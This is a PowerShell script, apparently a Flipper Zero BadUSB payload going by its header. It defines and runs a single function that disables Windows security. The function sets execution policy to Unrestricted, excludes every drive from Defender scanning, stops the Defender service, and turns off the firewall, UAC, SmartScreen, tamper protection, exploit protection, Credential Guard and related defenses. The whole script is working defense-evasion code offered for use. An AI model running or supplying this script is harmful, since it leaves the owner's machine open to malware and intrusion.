##################################################################################################################################################################
##################################################################################################################################################################
<#
                 _..--+~/@-~--.
             _-=~      (  .   "}
          _-~     _.--=.\ \""""
        _~      _-       \ \_\
       =      _=          '--'
      '      =                             .
     :      :       ____                   '=_. ___
___  |      ;                            ____ '~--.~.
     ;      ;                               _____  } |
  ___=       \ ___ __     __..-...__           ___/__/__
     :        =_     _.-~~          ~~--.__
_____ \         ~-+-~                   ___~=_______
     ~@#~~ == ...______ __ ___ _--~~--_
                                                    =
██████╗ ███████╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗ ██╗ ██████╗ █████╗ 
██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██╔════╝███║██╔════╝██╔══██╗
██████╔╝███████╗███████║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ██║     ╚██║███████╗╚██████║
██╔══██╗╚════██║██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██║      ██║██╔═══██╗╚═══██║
██║  ██║███████║██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗╚██████╗ ██║╚██████╔╝█████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝ 
Script Version: 1
OS Version Script was written on: Microsoft Windows 11 Pro : 10.0.25100 Build 26100
PSVersion 5.1.26100.2161 : PSEdition Desktop : Build Version 10.0.26100.2161
Flipper Zero FirmWare mntm-001 https://momentum-fw.dev/update/
Description of Script: 
#>
##################################################################################################################################################################
#==============================Beginning==========================================================================================================================
##################################################################################################################################################################
function Disable-AllSecurityFeatures {

    #Set execution policy to unrestricted
    Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force; Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; Set-ExecutionPolicy Unrestricted -Scope Process -Force

    #Set exclusion to the current drives
    [ARRAY]$Drives = (Get-WmiObject -Class Win32_LogicalDisk).DeviceID
    FOREACH ( $Drive IN $Drives){
      $Drive = $Drive+"\"
      Add-MpPreference -ExclusionPath "$Drive"
    }
    
    # Disable Windows Defender Real-Time Protection
    Set-MpPreference -DisableRealtimeMonitoring $true

    # Stop Windows Defender services
    Stop-Service -Name "WinDefend" -Force
    Set-Service -Name "WinDefend" -StartupType Disabled

    # Disable Windows Firewall for all profiles
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

    # Disable ASR Rules
    Set-MpPreference -AttackSurfaceReductionRules_Actions Disable

    # Disable Controlled Folder Access
    Set-MpPreference -EnableControlledFolderAccess Disabled

    # Disable Exploit Protection
    Set-ProcessMitigation -PolicyName "Default" -Option Off

    # Disable UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0

    # Disable Windows SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"

    # Disable Network Inspection System
    Set-MpPreference -DisableIntrusionPreventionSystem $true

    # Disable Tamper Protection (Requires reboot)
    Set-MpPreference -DisableTamperProtection $true

    # Disable Windows Defender Application Guard
    Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-ApplicationGuard

    # Disable Windows Defender Credential Guard
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 0 /f

    # Disable Scheduled Scans
    Set-MpPreference -DisableScheduleTaskCheck $true

    Write-Output "All specified security features have been disabled."
}

# Call the function to disable all security features
Disable-AllSecurityFeatures
##################################################################################################################################################################
#==============================End================================================================================================================================
##################################################################################################################################################################
